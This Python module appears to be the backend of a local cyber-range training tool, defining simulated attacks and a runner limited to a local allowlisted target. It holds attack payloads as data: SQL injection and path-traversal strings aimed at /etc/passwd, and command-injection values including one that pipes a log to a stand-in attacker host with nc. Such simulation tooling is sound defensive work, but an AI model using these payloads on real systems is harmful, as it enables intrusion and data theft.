from __future__ import annotations

import socket
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlparse

import httpx

from app.core.config import settings
from app.core.exceptions import bad_request
from app.models.enums import Severity
from app.schemas.event import EventCreate


@dataclass(frozen=True)
class RangeScenario:
    id: str
    name: str
    description: str
    severity: str
    mitre_tactics: list[str]
    mitre_techniques: list[str]
    target_path: str
    cli_examples: list[str]
    safety_notes: list[str]
    expected_detections: list[str]


RANGE_SCENARIOS: dict[str, RangeScenario] = {
    "range_brute_force": RangeScenario(
        id="range_brute_force",
        name="Local Brute Force Login",
        description="Runs repeated login attempts against the intentionally vulnerable local target.",
        severity="high",
        mitre_tactics=["Credential Access"],
        mitre_techniques=["T1110"],
        target_path="/login",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/login -H "Content-Type: application/json" -d "{\\"username\\":\\"admin\\",\\"password\\":\\"wrongpass\\"}"',
            'curl -s -X POST http://127.0.0.1:8088/login -H "Content-Type: application/json" -d "{\\"username\\":\\"admin\\",\\"password\\":\\"CyberGuard!2026\\"}"',
        ],
        safety_notes=["Targets only the disposable local range login endpoint."],
        expected_detections=["brute_force", "failed_login_burst"],
    ),
    "range_sql_injection": RangeScenario(
        id="range_sql_injection",
        name="Local SQL Injection Attempt",
        description="Sends a classic SQL injection payload to a toy local search endpoint.",
        severity="high",
        mitre_tactics=["Initial Access"],
        mitre_techniques=["T1190"],
        target_path="/search",
        cli_examples=[
            'curl -s "http://127.0.0.1:8088/search?q=%27%20OR%20%271%27%3D%271%27--"',
        ],
        safety_notes=["Payload is executed only against a toy local endpoint with dummy data."],
        expected_detections=["sql_injection_attempt"],
    ),
    "range_path_traversal": RangeScenario(
        id="range_path_traversal",
        name="Local Path Traversal Attempt",
        description="Requests traversal-style file paths against the local dummy file endpoint.",
        severity="high",
        mitre_tactics=["Credential Access", "Discovery"],
        mitre_techniques=["T1083"],
        target_path="/files",
        cli_examples=[
            'curl -s "http://127.0.0.1:8088/files?path=../../etc/passwd"',
        ],
        safety_notes=["The target blocks traversal and exposes no host filesystem."],
        expected_detections=["path_traversal_attempt"],
    ),
    "range_exfiltration": RangeScenario(
        id="range_exfiltration",
        name="Local Data Exfiltration Simulation",
        description="Stages repeated dummy sensitive-file reads and outbound transfer events inside the local range.",
        severity="critical",
        mitre_tactics=["Collection", "Exfiltration"],
        mitre_techniques=["T1560", "T1048"],
        target_path="/exfil",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/exfil -H "Content-Type: application/json" -d "{\\"file\\":\\"sensitive/customer_database_export.csv\\",\\"size_mb\\":120}"',
        ],
        safety_notes=["Only dummy files inside the disposable target are referenced."],
        expected_detections=["data_exfiltration"],
    ),
    "range_ransomware": RangeScenario(
        id="range_ransomware",
        name="Local Ransomware Behavior Simulation",
        description="Renames dummy files inside the disposable target and logs ransomware-style endpoint signals.",
        severity="critical",
        mitre_tactics=["Impact"],
        mitre_techniques=["T1486"],
        target_path="/ransomware/simulate",
        cli_examples=[
            "curl -s -X POST http://127.0.0.1:8088/ransomware/simulate",
        ],
        safety_notes=["Only in-memory dummy file state is changed; no host files are mounted."],
        expected_detections=["ransomware_simulation"],
    ),
    "range_port_scan": RangeScenario(
        id="range_port_scan",
        name="Controlled Local Port Scan",
        description="Uses the backend to probe only approved ports on the local range target container.",
        severity="medium",
        mitre_tactics=["Discovery"],
        mitre_techniques=["T1046"],
        target_path="ports 8088-8103",
        cli_examples=[
            "Use the UI launch button; Docker exposes only the safe HTTP target on 127.0.0.1:8088.",
        ],
        safety_notes=["The runner scans only hardcoded range-target ports, never user-supplied hosts."],
        expected_detections=["port_scan"],
    ),
    "range_dns_tunneling": RangeScenario(
        id="range_dns_tunneling",
        name="Local DNS Tunneling Simulation",
        description="Sends long encoded DNS-like queries to simulate covert data exfiltration over DNS.",
        severity="high",
        mitre_tactics=["Command and Control", "Exfiltration"],
        mitre_techniques=["T1071.004", "T1048"],
        target_path="/dns/query",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/dns/query -H "Content-Type: application/json" -d "{\\"query\\":\\"c2VjcmV0LWRhdGEudHVuLmV4YW1wbGUubG9jYWw\\"}"',
        ],
        safety_notes=["Queries are processed only by the local disposable range target."],
        expected_detections=["dns_tunneling_suspected"],
    ),
    "range_password_spray": RangeScenario(
        id="range_password_spray",
        name="Local Password Spray Simulation",
        description="Attempts one common password across many usernames to emulate low-and-slow spraying.",
        severity="high",
        mitre_tactics=["Credential Access"],
        mitre_techniques=["T1110.003"],
        target_path="/auth/spray",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/auth/spray -H "Content-Type: application/json" -d "{\\"username\\":\\"finance.manager\\",\\"password\\":\\"Winter2026!\\"}"',
        ],
        safety_notes=["Spray actions target only toy authentication logic with dummy users."],
        expected_detections=["password_spray"],
    ),
    "range_command_injection": RangeScenario(
        id="range_command_injection",
        name="Local Command Injection Attempt",
        description="Submits shell metacharacter payloads to a toy endpoint to simulate command injection.",
        severity="high",
        mitre_tactics=["Execution", "Initial Access"],
        mitre_techniques=["T1059", "T1190"],
        target_path="/exec",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/exec -H "Content-Type: application/json" -d "{\\"input\\":\\"report.csv; whoami\\"}"',
        ],
        safety_notes=["No system commands are executed; payloads are logged and blocked in-app."],
        expected_detections=["command_injection_attempt"],
    ),
    "range_privilege_escalation": RangeScenario(
        id="range_privilege_escalation",
        name="Local Privilege Escalation Simulation",
        description="Generates suspicious admin elevation telemetry to mimic privilege escalation behavior.",
        severity="critical",
        mitre_tactics=["Privilege Escalation", "Persistence"],
        mitre_techniques=["T1068", "T1548"],
        target_path="/priv-esc",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/priv-esc -H "Content-Type: application/json" -d "{\\"username\\":\\"analyst\\",\\"action\\":\\"sudo su -\\"}"',
        ],
        safety_notes=["Events are synthetic lab traces; no real privilege changes happen on host or container."],
        expected_detections=["privilege_escalation_suspected"],
    ),
}


class RangeAttackRunner:
    allowed_hosts = {"range-target", "localhost", "127.0.0.1"}
    scan_ports = list(range(8088, 8104))

    def __init__(self) -> None:
        self.target_url = settings.range_target_url.rstrip("/")
        self.public_url = settings.range_public_url.rstrip("/")
        self._assert_allowed_target(self.target_url)

    def _assert_allowed_target(self, raw_url: str) -> None:
        parsed = urlparse(raw_url)
        if parsed.scheme not in {"http", "https"}:
            raise bad_request("Range target URL must be HTTP(S)")
        if parsed.hostname not in self.allowed_hosts:
            raise bad_request("Range target is outside the local allowlist")

    def scenario_public(self, scenario: RangeScenario) -> dict[str, Any]:
        target = f"{self.public_url}{scenario.target_path}" if scenario.target_path.startswith("/") else scenario.target_path
        return {
            "id": scenario.id,
            "name": scenario.name,
            "description": scenario.description,
            "severity": scenario.severity,
            "mitre_tactics": scenario.mitre_tactics,
            "mitre_techniques": scenario.mitre_techniques,
            "execution_mode": "local_range",
            "target_url": target,
            "cli_examples": scenario.cli_examples,
            "safety_notes": scenario.safety_notes,
            "expected_detections": scenario.expected_detections,
        }

    def status(self) -> tuple[bool, str]:
        if not settings.range_enabled:
            return False, "Cyber range is disabled"
        try:
            with httpx.Client(timeout=5.0) as client:
                resp = client.get(f"{self.target_url}/health")
                resp.raise_for_status()
            return True, "Range target is healthy"
        except Exception as exc:
            return False, f"Range target is unavailable: {exc}"

    def reset(self) -> None:
        with httpx.Client(timeout=10.0) as client:
            resp = client.post(
                f"{self.target_url}/_range/reset",
                headers={"X-Range-Secret": settings.range_shared_secret},
            )
            resp.raise_for_status()

    def drain_logs(self) -> list[dict[str, Any]]:
        with httpx.Client(timeout=10.0) as client:
            resp = client.get(
                f"{self.target_url}/_range/logs",
                headers={"X-Range-Secret": settings.range_shared_secret},
            )
            resp.raise_for_status()
            data = resp.json()
        logs = data.get("logs", [])
        return logs if isinstance(logs, list) else []

    def run(self, scenario_id: str) -> tuple[RangeScenario, int, list[dict[str, Any]]]:
        if not settings.range_enabled:
            raise bad_request("Cyber range is disabled")
        scenario = RANGE_SCENARIOS.get(scenario_id)
        if not scenario:
            raise bad_request("Unknown range scenario")
        requests = getattr(self, f"_run_{scenario_id}")()
        logs = self.drain_logs()
        return scenario, requests, logs

    def _run_range_brute_force(self) -> int:
        attempts = [
            "password123",
            "admin",
            "welcome",
            "letmein",
            "qwerty123",
            "summer2026",
            "cyberguard",
            "wrongpass",
            "demo12345",
            "changeme2026",
            "CyberGuard!2026",
        ]
        with httpx.Client(timeout=10.0) as client:
            for password in attempts:
                client.post(
                    f"{self.target_url}/login",
                    json={"username": "admin", "password": password},
                )
        return len(attempts)

    def _run_range_sql_injection(self) -> int:
        payloads = [
            "normal query",
            "' OR '1'='1'--",
            "demo' UNION SELECT username,password FROM users--",
        ]
        with httpx.Client(timeout=10.0) as client:
            for payload in payloads:
                client.get(f"{self.target_url}/search", params={"q": payload})
        return len(payloads)

    def _run_range_path_traversal(self) -> int:
        paths = ["public/readme.txt", "../../etc/passwd", "..\\..\\windows\\win.ini"]
        with httpx.Client(timeout=10.0) as client:
            for path in paths:
                client.get(f"{self.target_url}/files", params={"path": path})
        return len(paths)

    def _run_range_exfiltration(self) -> int:
        files = [
            "sensitive/customer_database_export.csv",
            "sensitive/hr_salary_q4.xlsx",
            "sensitive/customer_database_export.csv",
        ]
        with httpx.Client(timeout=10.0) as client:
            for idx, filename in enumerate(files):
                client.post(
                    f"{self.target_url}/exfil",
                    json={"file": filename, "size_mb": 80 + (idx * 20), "username": "contractor1"},
                )
        return len(files)

    def _run_range_ransomware(self) -> int:
        with httpx.Client(timeout=10.0) as client:
            client.post(f"{self.target_url}/ransomware/simulate")
        return 1

    def _run_range_port_scan(self) -> int:
        parsed = urlparse(self.target_url)
        host = parsed.hostname or "range-target"
        for port in self.scan_ports:
            try:
                with socket.create_connection((host, port), timeout=0.5):
                    pass
            except OSError:
                pass
        return len(self.scan_ports)

    def _run_range_dns_tunneling(self) -> int:
        queries = [
            "healthcheck.local",
            "c2VjcmV0LXNlZ21lbnQtMDE=.corp.lab.local",
            "Y3JlZGVudGlhbD1hZG1pbjpQYXNzMTIz.corp.lab.local",
            "ZmlsZT1jdXN0b21lcnMuY3N2JmNodW5rPTM=.corp.lab.local",
            "ZXhmaWw9cGF5cm9sbC1kYXRhJmNoZWNrPTQ=.corp.lab.local",
        ]
        with httpx.Client(timeout=10.0) as client:
            for query in queries:
                client.post(f"{self.target_url}/dns/query", json={"query": query})
        return len(queries)

    def _run_range_password_spray(self) -> int:
        usernames = [
            "admin",
            "it.support",
            "finance.manager",
            "ceo.assistant",
            "ops.lead",
            "analyst",
            "helpdesk",
            "intern",
            "hr.manager",
            "developer",
        ]
        with httpx.Client(timeout=10.0) as client:
            for username in usernames:
                client.post(
                    f"{self.target_url}/auth/spray",
                    json={"username": username, "password": "Winter2026!"},
                )
        return len(usernames)

    def _run_range_command_injection(self) -> int:
        payloads = [
            "report.csv",
            "report.csv; whoami",
            "backup.tar && id",
            "$(cat /etc/passwd)",
            "audit.log | nc attacker.local 4444",
        ]
        with httpx.Client(timeout=10.0) as client:
            for payload in payloads:
                client.post(f"{self.target_url}/exec", json={"input": payload})
        return len(payloads)

    def _run_range_privilege_escalation(self) -> int:
        actions = [
            {"username": "analyst", "action": "sudo -l"},
            {"username": "analyst", "action": "sudo su -"},
            {"username": "service.backup", "action": "token::elevate"},
            {"username": "service.backup", "action": "add user to administrators"},
        ]
        with httpx.Client(timeout=10.0) as client:
            for item in actions:
                client.post(f"{self.target_url}/priv-esc", json=item)
        return len(actions)


def logs_to_events(logs: list[dict[str, Any]]) -> list[EventCreate]:
    out: list[EventCreate] = []
    for item in logs:
        try:
            ts = datetime.fromisoformat(str(item.get("timestamp", "")).replace("Z", "+00:00"))
        except ValueError:
            ts = datetime.now(timezone.utc)
        sev_raw = str(item.get("severity", "low")).lower()
        try:
            severity = Severity(sev_raw)
        except ValueError:
            severity = Severity.low
        port_raw = item.get("port")
        try:
            port = int(port_raw) if port_raw is not None else None
        except (TypeError, ValueError):
            port = None
        metadata = item.get("metadata")
        out.append(
            EventCreate(
                timestamp=ts,
                source_ip=str(item.get("source_ip") or "127.0.0.1"),
                destination_ip=str(item.get("destination_ip") or "range-target"),
                username=item.get("username"),
                event_type=str(item.get("event_type") or "range_event"),
                status=item.get("status"),
                severity=severity,
                message=item.get("message"),
                protocol=str(item.get("protocol") or "tcp"),
                port=port,
                raw_log=item.get("raw_log"),
                source_system=str(item.get("source_system") or "range-target"),
                metadata=metadata if isinstance(metadata, dict) else None,
            )
        )
    return out
